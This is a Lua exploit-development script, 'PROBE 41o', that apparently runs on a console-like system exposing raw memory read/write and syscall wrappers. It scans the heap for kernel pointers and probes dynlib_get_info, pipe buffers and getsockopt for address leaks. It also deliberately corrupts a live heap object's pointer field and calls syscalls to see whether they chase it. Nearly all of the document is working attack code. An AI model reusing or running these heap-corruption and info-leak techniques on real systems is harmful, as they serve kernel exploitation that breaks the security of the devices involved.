-- CRASH_CLASS: RISKY (heap corruption for info leak)
-- PROBE 41o: corrupt heap object pointers to leak kernel data
-- Strategy:
--   A) Find live objects adjacent to freed regions (we can write there)
--   B) Overwrite a pointer field in a live object
--   C) Call syscalls that might dereference it and return data to us
--   D) Check if returned data contains kernel pointers (0xFFFFxxxx range)
-- Also:
--   E) Exhaustive kptr scan across wider heap range
--   F) Try dynlib_get_info with corrupted handle to leak module info

print("=== PROBE 41o: HEAP INFO LEAK ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function hex(n)
    if type(n) == "table" and n.h then
        return string.format("0x%08X%08X", n.h, n.l)
    end
    return string.format("0x%X", tonumber(n) or 0)
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function dump_qword(val)
    if type(val) == "table" and val.h then
        return string.format("%08X_%08X", val.h, val.l)
    end
    return string.format("%016X", to_num(val))
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, lo, hi)
    local ok1 = safe_wd(addr, lo)
    local ok2 = safe_wd(addr + 4, hi)
    return ok1 and ok2
end

local sc_mmap   = make_syscall(477)
local sc_munmap = make_syscall(588)
local sc_pipe   = make_syscall(42)
local sc_close  = make_syscall(6)
local sc_read   = make_syscall(3)
local sc_write  = make_syscall(4)
local sc_socket = make_syscall(97)
local sc_getsockopt = make_syscall(118)
local sc_dynlib_get_list = make_syscall(592)
local sc_dynlib_get_info = make_syscall(593)
local PAGE = 0x4000

local function do_mmap(sz)
    local ok, ret = pcall(function()
        return sc_mmap(uint64(0), uint64(sz), uint64(0x33),
            uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
    end)
    if not ok then return nil end
    local addr = to_num(ret)
    if addr == 0 or addr >= 0xFFFFFFFF00000000 then return nil end
    return addr
end

local base = do_mmap(PAGE)
if not base then print("mmap FAILED"); return end
print("anchor: " .. hex(base))
print("")

--------------------------------------------------------------------
-- SECTION 1: Exhaustive kptr scan (wider + denser than 41d)
-- Check every 8 bytes on non-zero pages for high-bit pointers
--------------------------------------------------------------------
print("--- SECTION 1: EXHAUSTIVE KPTR SCAN ---")
local kptrs = {}
local scanned_pages = 0
local scanned_qwords = 0

for i = 1, 384 do
    local pg = base - i * 0x1000
    if pg <= 0 then break end
    local v = safe_rd(pg)
    if v == nil then break end
    scanned_pages = scanned_pages + 1
    if v ~= 0 and v ~= 0xAFAFAFAF then
        -- dense scan: every 8 bytes, first 512 bytes of page
        for off = 0, 0x1F8, 8 do
            local q = safe_rq(pg + off)
            if q then
                scanned_qwords = scanned_qwords + 1
                local h, l = get_hi_lo(q)
                -- kernel range: high bytes are 0xFFFFFFxx
                if h >= 0xFFFFFF00 and h ~= 0xFFFFFFFF then
                    kptrs[#kptrs + 1] = {addr = pg + off, hi = h, lo = l}
                end
                -- also check for plausible kernel: 0xFFFF8xxx
                if h >= 0xFFFF8000 and h < 0xFFFFFF00 then
                    kptrs[#kptrs + 1] = {addr = pg + off, hi = h, lo = l}
                end
            end
        end
    end
end
print("scanned: " .. scanned_pages .. " pages, " .. scanned_qwords .. " qwords")
print("kernel pointers found: " .. #kptrs)
for j, k in ipairs(kptrs) do
    if j > 16 then break end
    print(string.format("  %s: %08X_%08X", hex(k.addr), k.hi, k.lo))
end
print("")

--------------------------------------------------------------------
-- SECTION 2: Locate memory.alloc buffers relative to anchor
-- If we can find our own buffers, we can use them as read targets
--------------------------------------------------------------------
print("--- SECTION 2: ALLOC BUFFER LOCATION ---")

-- alloc a buffer with a unique marker
local marker_buf = memory.alloc(256)
memory.write_dword(marker_buf, 0xCAFE1234)
memory.write_dword(marker_buf + 4, 0xDEAD5678)
memory.write_dword(marker_buf + 8, 0xBEEF9ABC)
print("marker_buf at: " .. hex(marker_buf))

-- scan for the marker in our readable range
local found_marker = nil
for i = 1, 256 do
    local pg = base - i * 0x1000
    if pg <= 0 then break end
    for off = 0, 0xF00, 4 do
        local d = safe_rd(pg + off)
        if d == 0xCAFE1234 then
            local d2 = safe_rd(pg + off + 4)
            if d2 == 0xDEAD5678 then
                found_marker = pg + off
                break
            end
        end
    end
    if found_marker then break end
end

if found_marker then
    print("FOUND marker at: " .. hex(found_marker))
    print("offset from anchor: " .. hex(base - found_marker))
    -- verify
    local v1 = safe_rd(found_marker + 8)
    print("verify [+8]: " .. (v1 and hex(v1) or "?") .. " (expect 0xBEEF9ABC)")
else
    print("marker NOT found in scan range")
end
print("")

--------------------------------------------------------------------
-- SECTION 3: dynlib_get_info leak attempt
-- Get the dynlib list, then try to read module info
-- The returned info struct may contain base addresses
--------------------------------------------------------------------
print("--- SECTION 3: DYNLIB INFO LEAK ---")

local handle_buf = memory.alloc(1024)
local num_buf = memory.alloc(8)

local ok_gl, ret_gl = pcall(function()
    return sc_dynlib_get_list(handle_buf, uint64(128), num_buf)
end)
print("dynlib_get_list: " .. (ok_gl and "ok" or "FAIL") ..
    " ret=" .. (ok_gl and hex(to_num(ret_gl)) or "?"))

local num_handles = safe_rd(num_buf)
print("num_handles: " .. (num_handles and tostring(num_handles) or "?"))

if num_handles and num_handles > 0 then
    -- read first few handles
    local handles = {}
    for i = 0, math.min(num_handles - 1, 7) do
        local h = safe_rd(handle_buf + i * 4)
        if h then
            handles[#handles + 1] = h
            print(string.format("  handle[%d] = 0x%X", i, h))
        end
    end

    -- try dynlib_get_info on each handle
    -- info struct is ~0x160 bytes
    local info_buf = memory.alloc(0x200)

    for idx, handle in ipairs(handles) do
        if idx > 4 then break end
        -- zero the buffer first
        for off = 0, 0x1F8, 4 do
            safe_wd(info_buf + off, 0)
        end
        -- set the size field (first 8 bytes = struct size)
        safe_wd(info_buf, 0x160)

        local ok_gi, ret_gi = pcall(function()
            return sc_dynlib_get_info(uint64(handle), info_buf)
        end)
        print(string.format("  get_info(0x%X): %s ret=%s",
            handle, ok_gi and "ok" or "FAIL",
            ok_gi and hex(to_num(ret_gi)) or "?"))

        if ok_gi then
            -- scan info_buf for interesting values
            local found_text = false
            local found_kptr = false
            for off = 0, 0x158, 8 do
                local q = safe_rq(info_buf + off)
                if q then
                    local h, l = get_hi_lo(q)
                    if h >= 0xFFFF8000 then
                        print(string.format("    [+%02X] %s KPTR!", off, dump_qword(q)))
                        found_kptr = true
                    end
                    if h == 0 and l >= 0x80000000 and l < 0x90000000 then
                        print(string.format("    [+%02X] %s TEXT", off, dump_qword(q)))
                        found_text = true
                    end
                    -- any large non-zero value
                    if (h ~= 0 or l > 0x10000) and h < 0xFFFF8000 then
                        if off <= 0x40 or h >= 1 then
                            print(string.format("    [+%02X] %s", off, dump_qword(q)))
                        end
                    end
                end
            end
            if not found_text and not found_kptr then
                print("    (no text or kernel pointers)")
            end
        end
    end
else
    print("  no handles or get_list failed")
end
print("")

--------------------------------------------------------------------
-- SECTION 4: Pipe buffer content leak
-- Create pipe, write data, check if the pipe's internal buffer
-- appears in our heap range (would give us a known-content target)
--------------------------------------------------------------------
print("--- SECTION 4: PIPE BUFFER SCAN ---")

local pipe_fds = memory.alloc(16)
local ok_p = pcall(function() sc_pipe(pipe_fds) end)
if ok_p then
    local rfd = safe_rd(pipe_fds)
    local wfd = safe_rd(pipe_fds + 4)
    print("pipe fds: r=" .. (rfd or "?") .. " w=" .. (wfd or "?"))

    if wfd and wfd > 0 then
        -- write a distinctive pattern to the pipe
        local wbuf = memory.alloc(64)
        memory.write_dword(wbuf, 0x50495045)     -- "PIPE"
        memory.write_dword(wbuf + 4, 0x4C45414B)  -- "LEAK"
        memory.write_dword(wbuf + 8, 0x54455354)  -- "TEST"
        memory.write_dword(wbuf + 12, 0x44415441) -- "DATA"

        local ok_w = pcall(function()
            sc_write(uint64(wfd), wbuf, uint64(16))
        end)
        print("write to pipe: " .. (ok_w and "ok" or "FAIL"))

        -- scan heap for "PIPE" marker
        local pipe_found = nil
        for i = 1, 256 do
            local pg = base - i * 0x1000
            if pg <= 0 then break end
            local v = safe_rd(pg)
            if v == nil then break end
            if v == 0x50495045 then
                local v2 = safe_rd(pg + 4)
                if v2 == 0x4C45414B then
                    pipe_found = pg
                    break
                end
            end
            -- also check within page
            if v ~= 0 and v ~= 0xAFAFAFAF then
                for off = 4, 0xF00, 4 do
                    local d = safe_rd(pg + off)
                    if d == 0x50495045 then
                        local d2 = safe_rd(pg + off + 4)
                        if d2 == 0x4C45414B then
                            pipe_found = pg + off
                            break
                        end
                    end
                end
            end
            if pipe_found then break end
        end

        if pipe_found then
            print("PIPE DATA FOUND at: " .. hex(pipe_found))
            -- dump context around it (might contain kernel buffer ptrs)
            for off = -0x40, 0x40, 8 do
                local q = safe_rq(pipe_found + off)
                if q then
                    local h, l = get_hi_lo(q)
                    local tag = ""
                    if h >= 0xFFFF8000 then tag = " KPTR!" end
                    if h == 0 and l >= 0x80000000 then tag = " TEXT?" end
                    if h == 3 then tag = " HEAP" end
                    print(string.format("  [%+03X] %s%s", off, dump_qword(q), tag))
                end
            end
        else
            print("pipe data NOT in scan range (kernel buffer)")
        end

        -- read back from pipe to verify
        local rbuf = memory.alloc(64)
        local ok_r = pcall(function()
            sc_read(uint64(rfd), rbuf, uint64(16))
        end)
        local rd1 = safe_rd(rbuf)
        print("read back: " .. (ok_r and "ok" or "FAIL") ..
            " data=" .. (rd1 and hex(rd1) or "?"))
    end

    -- close pipe
    if rfd and rfd > 0 then pcall(function() sc_close(rfd) end) end
    if wfd and wfd > 0 then pcall(function() sc_close(wfd) end) end
end
print("")

--------------------------------------------------------------------
-- SECTION 5: Socket option leak
-- getsockopt may return internal kernel data
--------------------------------------------------------------------
print("--- SECTION 5: SOCKET OPTION LEAK ---")
do
    local ok_s, sfd = pcall(function() return sc_socket(2, 1, 0) end)
    if ok_s then
        local fd = to_num(sfd)
        print("socket fd: " .. fd)
        if fd > 0 then
            local opt_buf = memory.alloc(256)
            local len_buf = memory.alloc(8)

            -- try various socket options that might leak info
            -- SOL_SOCKET=0xFFFF, SO_TYPE=0x1008, SO_SNDBUF=0x1001
            -- SO_RCVBUF=0x1002, SO_ERROR=0x1007
            local opts = {
                {level=0xFFFF, opt=0x1008, name="SO_TYPE"},
                {level=0xFFFF, opt=0x1001, name="SO_SNDBUF"},
                {level=0xFFFF, opt=0x1002, name="SO_RCVBUF"},
                {level=0xFFFF, opt=0x1007, name="SO_ERROR"},
                {level=0xFFFF, opt=0x0010, name="SO_LINGER"},
                {level=0xFFFF, opt=0x0020, name="SO_ACCEPTCONN"},
                {level=6, opt=1, name="TCP_NODELAY"},
            }

            for _, o in ipairs(opts) do
                -- zero buf, set len
                for off = 0, 64, 4 do safe_wd(opt_buf + off, 0) end
                safe_wd(len_buf, 256)

                local ok_go, ret_go = pcall(function()
                    return sc_getsockopt(uint64(fd), uint64(o.level),
                        uint64(o.opt), opt_buf, len_buf)
                end)
                if ok_go then
                    local rlen = safe_rd(len_buf)
                    local val = safe_rd(opt_buf)
                    local val2 = safe_rd(opt_buf + 4)
                    print(string.format("  %s: ret=%s len=%s val=%s %s",
                        o.name, hex(to_num(ret_go)),
                        rlen and tostring(rlen) or "?",
                        val and hex(val) or "?",
                        val2 and val2 ~= 0 and hex(val2) or ""))
                end
            end

            pcall(function() sc_close(fd) end)
        end
    else
        print("socket create failed")
    end
end
print("")

--------------------------------------------------------------------
-- SECTION 6: Corrupt a live object's pointer, call dynlib syscalls
-- to see if they chase the corrupted pointer
--------------------------------------------------------------------
print("--- SECTION 6: POINTER CORRUPTION LEAK ---")
do
    -- find a live object with heap pointers adjacent to freed region
    local target_obj = nil
    local freed_end = nil

    for i = 1, 384 do
        local pg = base - i * 0x1000
        if pg <= 0 then break end
        local v = safe_rd(pg)
        if v == nil then break end

        if v == 0xAFAFAFAF then
            -- check next page for live object
            local next_pg = pg + 0x1000
            local nv = safe_rd(next_pg)
            if nv and nv ~= 0 and nv ~= 0xAFAFAFAF then
                -- found freed->live boundary
                -- check if live object has pointer fields
                local q0 = safe_rq(next_pg)
                local q8 = safe_rq(next_pg + 8)
                if q0 and q8 then
                    local h0, l0 = get_hi_lo(q0)
                    local h8, l8 = get_hi_lo(q8)
                    if (h0 == 3 or h8 == 3 or h0 == 1 or h8 == 1) then
                        target_obj = next_pg
                        freed_end = pg
                        break
                    end
                end
            end
        end
    end

    if target_obj then
        print("  live object at: " .. hex(target_obj))
        print("  freed region ends at: " .. hex(freed_end))

        -- dump the live object
        print("  object dump:")
        local saved = {}
        for off = 0, 0x78, 8 do
            local q = safe_rq(target_obj + off)
            if q then
                saved[off] = q
                local h, l = get_hi_lo(q)
                local tag = ""
                if h >= 0xFFFF8000 then tag = " KPTR!" end
                if h == 3 then tag = " HEAP" end
                if h == 1 then tag = " DATA" end
                if h ~= 0 or l ~= 0 then
                    print(string.format("    [+%02X] %s%s", off, dump_qword(q), tag))
                end
            end
        end

        -- find a HEAP pointer field we can corrupt
        local corrupt_off = nil
        local orig_hi = nil
        local orig_lo = nil
        for off = 8, 0x78, 8 do
            local q = saved[off]
            if q then
                local h, l = get_hi_lo(q)
                if h == 3 and l >= 0x10000000 then
                    corrupt_off = off
                    orig_hi = h
                    orig_lo = l
                    break
                end
            end
        end

        if corrupt_off then
            print(string.format("  corrupting [+%02X]: %08X_%08X",
                corrupt_off, orig_hi, orig_lo))

            -- write our info_buf address here instead
            -- so if a syscall reads through this pointer, it reads our buffer
            -- which we pre-fill with recognizable content
            local spy_buf = memory.alloc(256)
            for off = 0, 252, 4 do
                safe_wd(spy_buf + off, 0)
            end
            -- put markers at specific offsets
            safe_wd(spy_buf, 0x5F100001)

            -- actually: instead of complex indirection, let's just put
            -- a known kptr-range value and see if any syscall returns it
            -- Target: read from 0x1_0E324EE0 (the type desc we found)
            -- by pointing the object's ptr to the base of a structure
            -- that has 0x1_0E324EE0 at a known offset

            -- Simpler: overwrite with the address of our marker_buf
            -- If a syscall reads through this field, the result will
            -- contain our marker (0xCAFE1234)
            if found_marker then
                print("  redirecting to marker_buf via heap addr")
                -- The marker is at found_marker in heap
                -- The pointer field expects a heap address (hi=3)
                -- marker_buf address from memory.alloc: might be in 0x3_1xxx range too

                -- Actually just write the marker_buf address
                local mb_lo = to_num(marker_buf)
                -- memory.alloc returns a 32-bit addr, so full 64-bit is 0x0_XXXXXXXX
                -- But heap pointers are 0x3_1xxxxxxx
                -- Let's use found_marker which IS in the heap range
                -- found_marker is a regular number < 2^32
                -- But it should be the lower 32 bits of a 0x3_1xxxxxxx addr
                -- Actually found_marker = base - offset, and base is ~0x3_1xxxxxxx
                -- So found_marker IS the low 32 bits... but the high bits are 3
                -- We need to write the full 64-bit value
                safe_wd(target_obj + corrupt_off, found_marker % 0x100000000)
                safe_wd(target_obj + corrupt_off + 4, 3)  -- hi = 0x00000003

                local verify = safe_rq(target_obj + corrupt_off)
                print("  verify: " .. (verify and dump_qword(verify) or "FAULT"))

                -- now try syscalls
                print("  trying syscalls...")

                -- dynlib walk
                local hb2 = memory.alloc(1024)
                local nb2 = memory.alloc(8)
                pcall(function() sc_dynlib_get_list(hb2, 128, nb2) end)
                print("    dynlib_get_list done")

                -- check marker_buf for changes
                local m1 = safe_rd(marker_buf)
                print("    marker[0] = " .. (m1 and hex(m1) or "?") ..
                    " (was 0xCAFE1234)")

                -- sigaction walk
                local sa = memory.alloc(64)
                for sig = 1, 8 do
                    pcall(function() make_syscall(416)(sig, uint64(0), sa) end)
                end

                -- check again
                local m2 = safe_rd(marker_buf)
                if m2 ~= m1 then
                    print("    marker CHANGED after sigaction: " .. hex(m2))
                end

                -- pipe/socket churn
                for i = 1, 4 do
                    local pb = memory.alloc(16)
                    pcall(function() sc_pipe(pb) end)
                    local f0 = safe_rd(pb)
                    local f1 = safe_rd(pb + 4)
                    if f0 and f0 > 0 then pcall(function() sc_close(f0) end) end
                    if f1 and f1 > 0 then pcall(function() sc_close(f1) end) end
                end

                local m3 = safe_rd(marker_buf)
                if m3 ~= m1 then
                    print("    marker CHANGED after pipe churn: " .. hex(m3))
                end
            end

            -- RESTORE original pointer
            print("  restoring original pointer...")
            safe_wd(target_obj + corrupt_off, orig_lo)
            safe_wd(target_obj + corrupt_off + 4, orig_hi)
            local restored = safe_rq(target_obj + corrupt_off)
            print("  restored: " .. (restored and dump_qword(restored) or "FAULT"))
        else
            print("  no HEAP pointer field found in object")
        end
    else
        print("  no suitable live object found adjacent to freed region")
    end
end
print("")

pcall(function() sc_munmap(uint64(base), uint64(PAGE)) end)
print("=== PROBE 41o COMPLETE ===")
